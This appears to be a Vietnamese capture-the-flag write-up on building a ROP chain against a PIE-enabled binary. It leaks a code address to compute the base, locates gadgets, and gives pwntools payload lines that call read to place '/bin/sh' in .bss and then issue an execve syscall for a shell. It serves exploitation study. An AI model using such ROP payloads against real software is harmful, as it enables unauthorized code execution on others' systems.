# Xây dựng ROPchain
Cơ chế PIE đang bật nên các gadget cũng bị thay đổi địa chỉ trong RAM ngẫu nhiên mỗi lần chạy.

Để bypass PIE thì cần leak 1 địa chỉ tại phân cùng nằm trong .text 

Vì các phân vùng khác nhau sẽ có base address khác nhau nên cần tìm đúng phân vùng mà ta cần dùng (Ví dụ muốn tìm gadget và .BSS lưu /bin/sh thì sẽ cần leak địa chỉ trong vùng .text). Nếu leak địa chỉ stack để tính offset của địa chỉ vùng .text sẽ bị lệch offset gây sai kết quả.

Trong vùng buffer có thể ghi đè có 1 địa chỉ trong phân vùng CODE có thể được leak khi nối vào chuỗi khi print
<img width="1462" height="707" alt="Screenshot 2026-09-15 213406" src="https://github.com/user-attachments/assets/b724ed4a-4d6a-48d2-91c5-257b77e91cfd" />
Nhờ việc leak được 1 địa chỉ trong phân vùng CODE thì đã có 1 hướng đi rõ ràng hơn:
<img width="1766" height="742" alt="Screenshot 2026-09-15 214259" src="https://github.com/user-attachments/assets/b50af4b3-f6d6-4669-a878-d153217d6e86" />


Khi đã có địa chỉ leak_CODE thì có thể tính base qua công thức:

    leak_main= leak_CODE + offset đến main
    base= leak_main - exe.sym['main']

Sử dụng base address này để tính địa chỉ thực của các gadget, hàm read:

    gadget= base + offet đến gadget
    leak_read=base+exe.sym['read']

Đã đủ các gadget thì có thể gọi hàm read để nhập '/bin/sh'

    payload+=p64(pop_rdi)+p64(0)
    payload+=p64(pop_rsi)+p64(leak_BSS)
    payload+=p64(pop_rdx)+p64(8)
    payload+=p64(leak_read)

Cuối cùng gọi syscall

    payload+=p64(pop_rdi)+p64(leak_BSS)
    payload+=p64(pop_rsi)+p64(0)
    payload+=p64(pop_rdx)+p64(0)
    payload+=p64(pop_rax)+p64(59)
    payload+=p64(syscall)

